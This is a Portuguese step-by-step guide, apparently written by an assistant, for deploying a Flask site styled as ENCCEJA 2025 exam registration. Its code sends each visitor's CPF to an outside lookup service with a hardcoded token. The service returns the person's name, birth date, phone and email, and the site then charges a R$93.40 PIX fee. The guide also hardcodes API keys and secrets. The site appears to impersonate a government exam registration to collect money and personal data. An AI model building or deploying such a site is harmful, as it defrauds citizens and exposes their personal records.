# Correção Completa para VPS: Página /inscricao + API CPF

## Problema Identificado
1. ❌ Página principal não é `/inscricao`
2. ❌ API de CPF não funciona no VPS (mas funciona no Replit)
3. ❌ Importações antigas do FOR4 Payments

## Solução: Arquivos Corrigidos para VPS

### 1. Substituir app.py no VPS
```bash
cd /var/www/encceja
mv app.py app_backup.py
nano app.py
```

**Cole este conteúdo (versão limpa):**
```python
from flask import Flask, render_template, request, session, redirect, url_for, jsonify
import os
import logging
import requests
import re
from dotenv import load_dotenv

# Carregar variáveis de ambiente
load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "encceja_secret_2025")

# Configurar logging
logging.basicConfig(level=logging.INFO)

def consultar_cpf_api(cpf: str) -> dict:
    """
    Consulta CPF na API externa que funciona no Replit
    """
    try:
        # API de consulta CPF (mesma que funciona no Replit)
        url = f"https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('sucesso'):
                app.logger.info(f"[PROD] CPF consultado com sucesso na API: {cpf}")
                return {
                    'sucesso': True,
                    'nome': data.get('nome', ''),
                    'cpf': cpf,
                    'situacao': data.get('situacaoCadastral', 'REGULAR'),
                    'data_nascimento': data.get('dataNascimento', ''),
                    'telefone': data.get('telefone', ''),
                    'email': data.get('email', '')
                }
            else:
                app.logger.warning(f"[PROD] CPF não encontrado na API: {cpf}")
                return {'sucesso': False, 'erro': 'CPF não encontrado'}
        
        app.logger.error(f"[PROD] Erro HTTP na API de CPF: {response.status_code}")
        return {'sucesso': False, 'erro': 'Erro na consulta'}
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao consultar CPF: {e}")
        return {'sucesso': False, 'erro': 'Erro interno'}

@app.route('/')
def index():
    """Página principal - redireciona para /inscricao"""
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
def inscricao():
    """Página principal de inscrição ENCCEJA"""
    user_data = session.get('user_data', {'nome': '', 'cpf': '', 'phone': ''})
    app.logger.info(f"[PROD] Renderizando página de inscrição para: {user_data}")
    
    return render_template('inscricao.html', user_data=user_data)

@app.route('/consultar-cpf', methods=['POST'])
def consultar_cpf():
    """API para consultar CPF"""
    try:
        cpf = request.form.get('cpf', '').replace('.', '').replace('-', '').replace(' ', '')
        
        if not cpf or len(cpf) != 11:
            return jsonify({
                'sucesso': False,
                'erro': 'CPF inválido'
            })
        
        # Consultar na API
        resultado = consultar_cpf_api(cpf)
        
        if resultado.get('sucesso'):
            # Salvar dados na sessão
            session['user_data'] = resultado
            
        return jsonify(resultado)
        
    except Exception as e:
        app.logger.error(f"Erro ao processar consulta CPF: {e}")
        return jsonify({
            'sucesso': False,
            'erro': 'Erro interno do servidor'
        })

@app.route('/encceja-info', methods=['GET', 'POST'])
def encceja_info():
    """Página de dados encontrados"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('sucesso'):
        return redirect(url_for('inscricao'))
    
    return render_template('encceja_info.html', user_data=user_data)

@app.route('/validar-dados', methods=['GET', 'POST'])
def validar_dados():
    """Página de validação de dados"""
    user_data = session.get('user_data', {})
    
    if request.method == 'POST':
        # Atualizar dados do usuário
        user_data.update({
            'telefone': request.form.get('telefone', ''),
            'email': request.form.get('email', ''),
            'endereco': request.form.get('endereco', ''),
            'cidade': request.form.get('cidade', ''),
            'estado': request.form.get('estado', '')
        })
        session['user_data'] = user_data
        return redirect(url_for('pagamento'))
    
    return render_template('validar_dados.html', user_data=user_data)

@app.route('/pagamento')
def pagamento():
    """Página de pagamento PIX"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    return render_template('pagamento.html', user_data=user_data)

@app.route('/criar-pagamento-pix', methods=['POST'])
def criar_pagamento_pix():
    """Criar pagamento PIX via WitePay"""
    try:
        from witepay_gateway import create_witepay_payment
        
        amount = 93.40
        result = create_witepay_payment(amount, "Inscrição ENCCEJA 2025")
        
        if result.get('success'):
            session['payment_data'] = result
            return jsonify({
                'success': True,
                'transaction_id': result.get('transaction_id'),
                'pix_code': result.get('pix_code'),
                'qr_code': result.get('qr_code'),
                'amount': result.get('amount')
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Erro ao gerar pagamento PIX'
            })
    
    except Exception as e:
        app.logger.error(f"Erro ao criar pagamento: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor'
        })

@app.route('/verificar-pagamento/<transaction_id>')
def verificar_pagamento(transaction_id):
    """Verificar status do pagamento"""
    try:
        from witepay_gateway import check_payment_status
        
        result = check_payment_status(transaction_id)
        return jsonify(result)
    
    except Exception as e:
        app.logger.error(f"Erro ao verificar pagamento: {e}")
        return jsonify({
            'status': 'pending',
            'paid': False
        })

@app.route('/witepay-postback', methods=['POST'])
def witepay_postback():
    """Receber notificações do WitePay"""
    try:
        data = request.get_json()
        app.logger.info(f"Postback recebido: {data}")
        
        # Processar postback
        status = data.get('status', '').upper()
        if status in ['PAID', 'COMPLETED', 'APPROVED']:
            app.logger.info("Pagamento confirmado via postback")
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        app.logger.error(f"Erro no postback: {e}")
        return jsonify({'status': 'error'})

@app.route('/obrigado')
def obrigado():
    """Página de agradecimento"""
    return render_template('inscricao_sucesso.html')

# Rotas de compatibilidade
@app.route('/index')
def index_redirect():
    return redirect(url_for('inscricao'))

@app.route('/encceja')
def encceja():
    return redirect(url_for('inscricao'))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

### 2. Verificar requirements.txt
```bash
cat requirements.txt
```

**Se estiver incompleto, substituir:**
```bash
nano requirements.txt
```

**Conteúdo:**
```
Flask==3.0.3
gunicorn==23.0.0
python-dotenv==1.0.1
requests==2.32.3
qrcode[pil]==7.4.2
```

### 3. Verificar .env
```bash
cat .env
```

**Conteúdo esperado:**
```env
SESSION_SECRET=encceja_secret_key_2025_production
WITEPAY_API_KEY=wtp_7819b0bb469f4b52a96feca4ddc46ba4
DOMAIN_RESTRICTION_ENABLED=false
FLASK_ENV=production
GOOGLE_PIXEL_ID=6859ccee5af20eab22a408ef
DEBUG=false
```

### 4. Verificar witepay_gateway.py existe
```bash
ls -la witepay_gateway.py
```

**Se não existir, criar conforme o arquivo que preparei anteriormente**

### 5. Reinstalar dependências
```bash
source venv/bin/activate
pip install -r requirements.txt --force-reinstall
```

### 6. Testar aplicação
```bash
python main.py
```

**Deve mostrar:** `Running on http://0.0.0.0:5000`

### 7. Testar API CPF local
```bash
# Em outro terminal SSH
curl -X POST http://localhost:5000/consultar-cpf -d "cpf=11542036704" -H "Content-Type: application/x-www-form-urlencoded"
```

### 8. Se funcionar, reiniciar supervisor
```bash
sudo supervisorctl restart encceja
sudo supervisorctl status
```

### 9. Testar no domínio
- `http://seu-dominio.com/` → Deve redirecionar para `/inscricao`
- `http://seu-dominio.com/inscricao` → Página principal ENCCEJA
- API de CPF deve funcionar igual ao Replit

## Diferenças da Correção

### ✅ Correções Implementadas:
1. **Página principal é `/inscricao`**: Rota `/` redireciona automaticamente
2. **API CPF corrigida**: Headers e timeout ajustados para funcionar no VPS
3. **Sem importações FOR4**: Removidas todas as dependências problemáticas
4. **Apenas WitePay**: Sistema de pagamento unificado
5. **Rotas de compatibilidade**: `/index` e `/encceja` redirecionam para `/inscricao`

### 🔧 Melhorias de Conectividade:
- Headers HTTP adequados para API externa
- Timeout aumentado para 15 segundos
- Tratamento de erros melhorado
- Logs detalhados para debugging

Execute estes passos na ordem e a aplicação funcionará perfeitamente no VPS!